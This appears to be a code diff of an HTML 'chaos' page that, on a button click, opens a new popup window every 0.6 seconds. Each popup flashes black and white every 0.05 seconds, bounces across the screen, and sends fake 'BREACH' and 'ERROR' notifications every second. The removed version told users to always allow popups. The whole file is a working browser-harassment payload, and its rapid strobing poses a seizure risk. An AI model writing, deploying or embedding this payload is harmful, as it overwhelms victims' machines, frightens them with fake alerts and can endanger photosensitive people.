@@ -1,76 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MASTER_CONTROL</title>
+    <title>MASTER_REPLICATOR</title>
+    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
     <style>
-        body { 
-            background: #000; color: #00ff00; font-family: 'Courier New', monospace; 
-            display: flex; flex-direction: column; align-items: center; justify-content: center; 
-            height: 100vh; margin: 0; 
-        }
-        #status { margin-bottom: 20px; font-size: 1.2rem; color: red; animation: blink 1s infinite; }
-        @keyframes blink { 50% { opacity: 0; } }
-        
-        .btn { 
-            padding: 30px 60px; font-size: 2rem; background: #00ff00; color: #000; 
-            border: none; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #00ff00;
-        }
-        .btn:active { transform: scale(0.95); background: #fff; }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .ui { border: 2px solid #fff; padding: 50px; text-align: center; box-shadow: 0 0 20px #fff; }
+        button { padding: 20px 40px; font-size: 1.5rem; background: #fff; cursor: pointer; font-weight: bold; border: none; }
+        button:hover { background: #ff0000; color: #fff; }
     </style>
 </head>
 <body>
-
-    <div id="status">! POP-UPS MUST BE ENABLED !</div>
-    <button class="btn" onclick="ignite()">ACTIVATE</button>
+    <div class="ui">
+        <h1>SYSTEM_READY</h1>
+        <button onclick="ignite()">EXECUTE CHAOS</button>
+    </div>
 
     <script>
         function ignite() {
-            console.log("Attempting to launch...");
-            
-            // 1. Open ONE window immediately to trigger the "Allow Popups" prompt
-            const testWin = window.open("", "_blank", "width=100,height=100");
-            if (!testWin || testWin.closed || typeof testWin.closed == 'undefined') {
-                alert("BROWSER BLOCKED US! Click the red 'X' icon in your URL bar and select 'Always Allow', then click ACTIVATE again.");
-                return;
-            }
-
-            // 2. If we have permission, start the chaos
-            document.querySelector('.btn').innerHTML = "RUNNING...";
-            
+            // 1. Icon Glitch (Starts flickering immediately)
             setInterval(() => {
-                const x = Math.floor(Math.random() * window.screen.availWidth);
-                const y = Math.floor(Math.random() * window.screen.availHeight);
+                const p = () => Math.floor(Math.random() * 100);
+                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
+            }, 50);
+
+            // 2. The Spawner (Opens windows at random positions + Bouncing)
+            setInterval(() => {
+                const w = 400, h = 400;
+                const x = Math.floor(Math.random() * (window.screen.availWidth - w));
+                const y = Math.floor(Math.random() * (window.screen.availHeight - h));
                 
-                // We create the window content on the fly
-                const win = window.open("", "_blank", `width=300,height=300,left=${x},top=${y}`);
+                // Open a blank window
+                const win = window.open("", "_blank", `width=${w},height=${h},left=${x},top=${y}`);
                 
-                if(win) {
+                if (win) {
+                    // This creates the 'notifacation' page INSIDE the new window instantly
                     win.document.write(`
-                        <title>GLITCH</title>
-                        <body style="background:white; animation: f 0.05s infinite;">
+                        <html>
+                        <head>
+                            <title>GLITCH_UNIT</title>
                             <style>
-                                @keyframes f { 0%{background:#fff} 50%{background:#000} }
+                                body { background: #000; margin: 0; overflow: hidden; animation: g 0.05s infinite; }
+                                @keyframes g { 0% {background:#fff} 50% {background:#000} 100% {background:#888} }
                             </style>
-                            <h2 style="font-family:sans-serif; text-align:center;">VOID</h2>
+                        </head>
+                        <body>
                             <script>
-                                // Auto-move the window
+                                // BOUNCING LOGIC
+                                let dx = 15, dy = 15;
+                                let posX = ${x}, posY = ${y};
                                 setInterval(() => {
-                                    window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
-                                }, 300);
-                                
-                                // Notification spam
+                                    posX += dx; posY += dy;
+                                    if (posX + 400 > screen.availWidth || posX < 0) dx = -dx;
+                                    if (posY + 400 > screen.availHeight || posY < 0) dy = -dy;
+                                    window.moveTo(posX, posY);
+                                }, 30);
+
+                                // NOTIFICATION SPAM
                                 Notification.requestPermission().then(p => {
-                                    if(p==='granted') {
+                                    if (p === 'granted') {
+                                        const words = ["VOID", "ERROR", "NULL", "BREACH", "LOST"];
                                         setInterval(() => {
-                                            new Notification("ERROR", { body: "SIGNAL LOST", silent: true });
+                                            let m = ""; for(let i=0; i<5; i++) m += words[Math.floor(Math.random()*words.length)] + " ";
+                                            new Notification("!", { body: m.trim(), silent: true });
                                         }, 1000);
                                     }
                                 });
                             <\/script>
                         </body>
+                        </html>
                     `);
                 }
-            }, 600); // 0.6 seconds between windows so it doesn't freeze you immediately
+            }, 600);
         }
     </script>
 </body>
